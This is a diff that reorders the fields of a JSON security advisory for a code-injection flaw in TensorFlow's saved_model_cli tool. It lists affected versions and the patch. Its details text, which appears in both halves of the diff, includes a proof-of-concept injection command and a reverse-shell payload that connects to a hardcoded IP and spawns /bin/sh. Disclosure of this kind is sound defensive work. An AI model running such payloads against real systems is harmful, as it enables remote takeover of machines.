@@ -1,77 +1,16 @@
 {
-  "id": "GHSA-75c9-jrh4-79mc",
-  "summary": "Code injection in `saved_model_cli` in TensorFlow",
-  "details": "### Impact\nTensorFlow's `saved_model_cli` tool is vulnerable to a code injection:\n\n```\nsaved_model_cli run --input_exprs 'x=print(\"malicious code to run\")' --dir ./\n--tag_set serve --signature_def serving_default\n```\n\nThis can be used to open a reverse shell                                      \n\n```\nsaved_model_cli run --input_exprs 'hello=exec(\"\"\"\\nimport socket\\nimport\nsubprocess\\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\\ns.connect((\"10.0.2.143\",33419))\\nsubprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\"\"\")'\n--dir ./ --tag_set serve --signature_def serving_default\n```\n\nThis is because [the fix](https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7) for [CVE-2021-41228](https://nvd.nist.gov/vuln/detail/CVE-2021-41228) was incomplete. Under [certain code paths](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574) it still allows unsafe execution:\n\n```python\ndef preprocess_input_exprs_arg_string(input_exprs_str, safe=True):\n  # ...\n\n  for input_raw in filter(bool, input_exprs_str.split(';')):\n    # ...\n    if safe:\n      # ...\n    else:\n      # ast.literal_eval does not work with numpy expressions\n      input_dict[input_key] = eval(expr)  # pylint: disable=eval-used\n  return input_dict\n```\n\nThis code path was maintained for compatibility reasons as we had several test cases where numpy expressions were used as arguments.\n\nHowever, given that the tool is always run manually, the impact of this is still not severe. We have now removed the `safe=False` argument, so all parsing is done withough calling `eval`.\n\n### Patches\nWe have patched the issue in GitHub commit [c5da7af048611aa29e9382371f0aed5018516cac](https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac).\n\nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Andey Robins from the Cybersecurity Education and Research Lab in the Department of Computer Science at the University of Wyoming.",
-  "aliases": [
-    "BIT-tensorflow-2022-29216",
-    "CVE-2022-29216"
-  ],
-  "modified": "2023-12-06T01:02:14.614845Z",
-  "published": "2022-05-24T22:16:48Z",
-  "related": [
-    "CVE-2022-29216"
-  ],
-  "database_specific": {
-    "nvd_published_at": "2022-05-21T00:15:00Z",
-    "github_reviewed_at": "2022-05-24T22:16:48Z",
-    "severity": "HIGH",
-    "github_reviewed": true,
-    "cwe_ids": [
-      "CWE-94"
-    ]
-  },
-  "references": [
-    {
-      "type": "WEB",
-      "url": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-75c9-jrh4-79mc"
-    },
-    {
-      "type": "ADVISORY",
-      "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-29216"
-    },
-    {
-      "type": "WEB",
-      "url": "https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7"
-    },
-    {
-      "type": "WEB",
-      "url": "https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac"
-    },
-    {
-      "type": "PACKAGE",
-      "url": "https://github.com/tensorflow/tensorflow"
-    },
-    {
-      "type": "WEB",
-      "url": "https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574"
-    },
-    {
-      "type": "WEB",
-      "url": "https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4"
-    },
-    {
-      "type": "WEB",
-      "url": "https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2"
-    },
-    {
-      "type": "WEB",
-      "url": "https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1"
-    },
-    {
-      "type": "WEB",
-      "url": "https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0"
-    }
-  ],
   "affected": [
     {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/05/GHSA-75c9-jrh4-79mc/GHSA-75c9-jrh4-79mc.json"
+      },
       "package": {
-        "name": "tensorflow",
         "ecosystem": "PyPI",
+        "name": "tensorflow",
         "purl": "pkg:pypi/tensorflow"
       },
       "ranges": [
         {
-          "type": "ECOSYSTEM",
           "events": [
             {
               "introduced": "0"
@@ -79,7 +18,8 @@
             {
               "fixed": "2.6.4"
             }
-          ]
+          ],
+          "type": "ECOSYSTEM"
         }
       ],
       "versions": [
@@ -149,20 +89,19 @@
         "2.6.1",
         "2.6.2",
         "2.6.3"
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/05/GHSA-75c9-jrh4-79mc/GHSA-75c9-jrh4-79mc.json"
-      }
+      ]
     },
     {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/05/GHSA-75c9-jrh4-79mc/GHSA-75c9-jrh4-79mc.json"
+      },
       "package": {
-        "name": "tensorflow-cpu",
         "ecosystem": "PyPI",
+        "name": "tensorflow-cpu",
         "purl": "pkg:pypi/tensorflow-cpu"
       },
       "ranges": [
         {
-          "type": "ECOSYSTEM",
           "events": [
             {
               "introduced": "0"
@@ -170,7 +109,8 @@
             {
               "fixed": "2.6.4"
             }
-          ]
+          ],
+          "type": "ECOSYSTEM"
         }
       ],
       "versions": [
@@ -202,20 +142,19 @@
         "2.6.1",
         "2.6.2",
         "2.6.3"
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/05/GHSA-75c9-jrh4-79mc/GHSA-75c9-jrh4-79mc.json"
-      }
+      ]
     },
     {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/05/GHSA-75c9-jrh4-79mc/GHSA-75c9-jrh4-79mc.json"
+      },
       "package": {
-        "name": "tensorflow-gpu",
         "ecosystem": "PyPI",
+        "name": "tensorflow-gpu",
         "purl": "pkg:pypi/tensorflow-gpu"
       },
       "ranges": [
         {
-          "type": "ECOSYSTEM",
           "events": [
             {
               "introduced": "0"
@@ -223,7 +162,8 @@
             {
               "fixed": "2.6.4"
             }
-          ]
+          ],
+          "type": "ECOSYSTEM"
         }
       ],
       "versions": [
@@ -290,20 +230,19 @@
         "2.6.1",
         "2.6.2",
         "2.6.3"
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/05/GHSA-75c9-jrh4-79mc/GHSA-75c9-jrh4-79mc.json"
-      }
+      ]
     },
     {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/05/GHSA-75c9-jrh4-79mc/GHSA-75c9-jrh4-79mc.json"
+      },
       "package": {
-        "name": "tensorflow",
         "ecosystem": "PyPI",
+        "name": "tensorflow",
         "purl": "pkg:pypi/tensorflow"
       },
       "ranges": [
         {
-          "type": "ECOSYSTEM",
           "events": [
             {
               "introduced": "2.7.0"
@@ -311,26 +250,26 @@
             {
               "fixed": "2.7.2"
             }
-          ]
+          ],
+          "type": "ECOSYSTEM"
         }
       ],
       "versions": [
         "2.7.0",
         "2.7.1"
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/05/GHSA-75c9-jrh4-79mc/GHSA-75c9-jrh4-79mc.json"
-      }
+      ]
     },
     {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/05/GHSA-75c9-jrh4-79mc/GHSA-75c9-jrh4-79mc.json"
+      },
       "package": {
-        "name": "tensorflow",
         "ecosystem": "PyPI",
+        "name": "tensorflow",
         "purl": "pkg:pypi/tensorflow"
       },
       "ranges": [
         {
-          "type": "ECOSYSTEM",
           "events": [
             {
               "introduced": "2.8.0"
@@ -338,25 +277,25 @@
             {
               "fixed": "2.8.1"
             }
-          ]
+          ],
+          "type": "ECOSYSTEM"
         }
       ],
       "versions": [
         "2.8.0"
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/05/GHSA-75c9-jrh4-79mc/GHSA-75c9-jrh4-79mc.json"
-      }
+      ]
     },
     {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/05/GHSA-75c9-jrh4-79mc/GHSA-75c9-jrh4-79mc.json"
+      },
       "package": {
-        "name": "tensorflow-cpu",
         "ecosystem": "PyPI",
+        "name": "tensorflow-cpu",
         "purl": "pkg:pypi/tensorflow-cpu"
       },
       "ranges": [
         {
-          "type": "ECOSYSTEM",
           "events": [
             {
               "introduced": "2.7.0"
@@ -364,26 +303,26 @@
             {
               "fixed": "2.7.2"
             }
-          ]
+          ],
+          "type": "ECOSYSTEM"
         }
       ],
       "versions": [
         "2.7.0",
         "2.7.1"
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/05/GHSA-75c9-jrh4-79mc/GHSA-75c9-jrh4-79mc.json"
-      }
+      ]
     },
     {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/05/GHSA-75c9-jrh4-79mc/GHSA-75c9-jrh4-79mc.json"
+      },
       "package": {
-        "name": "tensorflow-cpu",
         "ecosystem": "PyPI",
+        "name": "tensorflow-cpu",
         "purl": "pkg:pypi/tensorflow-cpu"
       },
       "ranges": [
         {
-          "type": "ECOSYSTEM",
           "events": [
             {
               "introduced": "2.8.0"
@@ -391,25 +330,25 @@
             {
               "fixed": "2.8.1"
             }
-          ]
+          ],
+          "type": "ECOSYSTEM"
         }
       ],
       "versions": [
         "2.8.0"
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/05/GHSA-75c9-jrh4-79mc/GHSA-75c9-jrh4-79mc.json"
-      }
+      ]
     },
     {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/05/GHSA-75c9-jrh4-79mc/GHSA-75c9-jrh4-79mc.json"
+      },
       "package": {
-        "name": "tensorflow-gpu",
         "ecosystem": "PyPI",
+        "name": "tensorflow-gpu",
         "purl": "pkg:pypi/tensorflow-gpu"
       },
       "ranges": [
         {
-          "type": "ECOSYSTEM",
           "events": [
             {
               "introduced": "2.7.0"
@@ -417,26 +356,26 @@
             {
               "fixed": "2.7.2"
             }
-          ]
+          ],
+          "type": "ECOSYSTEM"
         }
       ],
       "versions": [
         "2.7.0",
         "2.7.1"
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/05/GHSA-75c9-jrh4-79mc/GHSA-75c9-jrh4-79mc.json"
-      }
+      ]
     },
     {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/05/GHSA-75c9-jrh4-79mc/GHSA-75c9-jrh4-79mc.json"
+      },
       "package": {
-        "name": "tensorflow-gpu",
         "ecosystem": "PyPI",
+        "name": "tensorflow-gpu",
         "purl": "pkg:pypi/tensorflow-gpu"
       },
       "ranges": [
         {
-          "type": "ECOSYSTEM",
           "events": [
             {
               "introduced": "2.8.0"
@@ -444,22 +383,83 @@
             {
               "fixed": "2.8.1"
             }
-          ]
+          ],
+          "type": "ECOSYSTEM"
         }
       ],
       "versions": [
         "2.8.0"
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/05/GHSA-75c9-jrh4-79mc/GHSA-75c9-jrh4-79mc.json"
-      }
+      ]
     }
+  ],
+  "aliases": [
+    "BIT-tensorflow-2022-29216",
+    "CVE-2022-29216"
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-94"
+    ],
+    "github_reviewed": true,
+    "github_reviewed_at": "2022-05-24T22:16:48Z",
+    "nvd_published_at": "2022-05-21T00:15:00Z",
+    "severity": "HIGH"
+  },
+  "details": "### Impact\nTensorFlow's `saved_model_cli` tool is vulnerable to a code injection:\n\n```\nsaved_model_cli run --input_exprs 'x=print(\"malicious code to run\")' --dir ./\n--tag_set serve --signature_def serving_default\n```\n\nThis can be used to open a reverse shell                                      \n\n```\nsaved_model_cli run --input_exprs 'hello=exec(\"\"\"\\nimport socket\\nimport\nsubprocess\\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\\ns.connect((\"10.0.2.143\",33419))\\nsubprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\"\"\")'\n--dir ./ --tag_set serve --signature_def serving_default\n```\n\nThis is because [the fix](https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7) for [CVE-2021-41228](https://nvd.nist.gov/vuln/detail/CVE-2021-41228) was incomplete. Under [certain code paths](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574) it still allows unsafe execution:\n\n```python\ndef preprocess_input_exprs_arg_string(input_exprs_str, safe=True):\n  # ...\n\n  for input_raw in filter(bool, input_exprs_str.split(';')):\n    # ...\n    if safe:\n      # ...\n    else:\n      # ast.literal_eval does not work with numpy expressions\n      input_dict[input_key] = eval(expr)  # pylint: disable=eval-used\n  return input_dict\n```\n\nThis code path was maintained for compatibility reasons as we had several test cases where numpy expressions were used as arguments.\n\nHowever, given that the tool is always run manually, the impact of this is still not severe. We have now removed the `safe=False` argument, so all parsing is done withough calling `eval`.\n\n### Patches\nWe have patched the issue in GitHub commit [c5da7af048611aa29e9382371f0aed5018516cac](https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac).\n\nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Andey Robins from the Cybersecurity Education and Research Lab in the Department of Computer Science at the University of Wyoming.",
+  "id": "GHSA-75c9-jrh4-79mc",
+  "modified": "2023-12-06T01:02:14.614845Z",
+  "published": "2022-05-24T22:16:48Z",
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-75c9-jrh4-79mc"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-29216"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/tensorflow/tensorflow"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0"
+    }
+  ],
+  "related": [
+    "CVE-2022-29216"
   ],
   "schema_version": "1.6.0",
   "severity": [
     {
-      "type": "CVSS_V3",
-      "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+      "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+      "type": "CVSS_V3"
     }
-  ]
+  ],
+  "summary": "Code injection in `saved_model_cli` in TensorFlow"
 }
